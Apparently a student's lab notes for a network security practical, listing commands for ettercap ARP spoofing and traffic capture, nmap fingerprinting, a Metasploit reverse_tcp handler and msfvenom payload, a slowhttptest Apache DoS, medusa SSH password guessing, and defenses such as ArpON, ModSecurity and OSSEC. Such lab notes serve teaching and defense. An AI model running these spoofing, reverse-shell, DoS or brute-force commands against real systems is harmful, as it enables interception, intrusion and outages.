# Práctica 2

## a) ettercap

* Installation  
	`sudo apt install ettercap-text-only`

* Options:
	* `-T` (text-cli)
	* `-q` (quiet)
	* `-w \<file\>` (output file)
	* `-i \<interface\>` (listening interface)
	* `-M` (MITM attack)

* **Arp spoofing**  
	`ettercap -qT -w output_file -M arp:remote /ip_victim// /ip_router//`
	
* **Check arp poisoning**  
	`arp -a | grep gateway`

* **Transfer ettercap output file through ssh with**  
	`scp lsi@10.11.48.155:/file/path .`

## c) Network MACs

* Options:
	* `-sn` (Disable port scan)

* Command
	`sudo nmap -sn -T5 10.11.48.0/23`

## d) Network Ipv6

* Commands
	```
	ping6 -I ens33 ff02::1
	ip -6 neigh
	```

## e) ens33 traffic

* Command
	`sudo ettercap -Tq -w pcap -i ens33`

## f) HTTP urls with ARP-spoofing

* Command
	```
	ettercap -qT -w pcap -M arp:remote /ip_victim// /ip_router//
	scp lsi@10.11.48.155:/home/lsi/pcap .
	wireshark pcap
	```

* Filtrar en wireshark las conexiones con protocolo HTTP.

* Para ver en tiempo real, activar el plugin `remote_browser` y configurarlo en `/etc/ettercap/etter.conf`
	`sudo ettercap -qT -w pcap -M arp:remote -P remote_browser /ip_victim// /ip_router//`

## g) Install Metasploit

* Instructions:
	https://computingforgeeks.com/install-metasploit-framework-on-debian/

* Set handler:
	```
	msfconsole -q
	msf6 > use exploit/multi/handler
	msf6 > set payload linux/x86/meterpreter/reverse_tcp
	msf6 > set lhost 10.11.48.155
	msf6 > set lport 4444
	msf6 > exploit
	```

* Create payload:
	```
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.48.155 LPORT=4444 -f elf > shell.elf
	chmod +x shell.elf
	./shell.elf
	```

## h) MITM ipv6

* Comamnd:
	

## i) Arpon sniffing detector

* Logs:
	`/var/log/arpon/arpon.log`

* Command:
	`arpon -i ens33 -S`

## j) Fingerprinting

* Options:
	`-sV`: Service version
	`-sC`: Script=default
	`-e`: interface
	`-sU`: Scan UDP ports

* Port scanning:
 `nmap -p- --open -T5 -v -n <ip>`

* Port scanning (ipv6):
 `nmap -p- --open -T5 -v -n -6 <ipv6>`

* Fingerprint:
	`nmap -sC -sV -p<open-ports>`

* OS fingerprinting:
	`nmap -O -T5 --osscan-guess <ip>`

## k) Connection monitoring

* Tools:
	* iftop
	* tcptrack

## m) Apache DoS

* Command:
	`slowhttptest -c 1000 -H -r 200 -w 512 -u http://10.11.48.154 -p 5`

## n) Modsecurity

* Install:
	```
	sudo apt install modsecurity-crs libapache2-mod-security2
	systemctl restart apache2
	sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity.conf
	```
 
* Enable mod:
	`sudo e2enmod security2`

* Config files:
	* `/etc/apache2/mods-enabled/scurity2.conf`
	* `/etc/modsecurity/modsecurity.conf`

* Modscurity config file (`/etc/modsecurity/modsecurity.conf`):
	* `SecRuleEngine DetectionOnly` replace with `SecRuleEngine On`
	* Add:
		```
		SecConnEngine On
		SecConnReadStateLimit 50
		SecConnWriteStateLimit 50
		```

## o)

* Ver apuntes Jorge

* Host name reverse DNS script:
	```
	#!/bin/bash
 
	for i in {​​​​​​​​48..63}​​​​​​​​; do
		for j in {​​​​​​​​0..255}​​​​​​​​; do
			res=$(dig -x 193.144.$i.$j | grep -A1 "ANSWER SECTION:" | tail -n1 | awk '{​​​​​​​​print $5}​​​​​​​​')
			if [ "$res" != "" ]; then
			echo "ip: 193.144.$i.$j   ->  $res"
			fi
		done
	done
	```

## p)

## q) Password Guessing

* Options:
	`-r`: Sleep time
	`-R`: Num retries
	`-t`: Concurrently hosts
	`-f`: Stop when it found the password

* Command:
	`medusa -U /users/dict -P /pass/dict -m ssh <ip>`

## r) Ossec

* Start:
	`/var/ossec/bin/ossec-control start`

* Unban:
	```
	/var/ossec/active-response/bin/host-deny.sh delete - 10.11.48.155
	/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.48.155
	```

* Change ban timeout:
	`/var/ossec/etc/ossec.conf` en la sección **\<active-response\>**

## s) Post-mortem

* Command:
	`cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a`
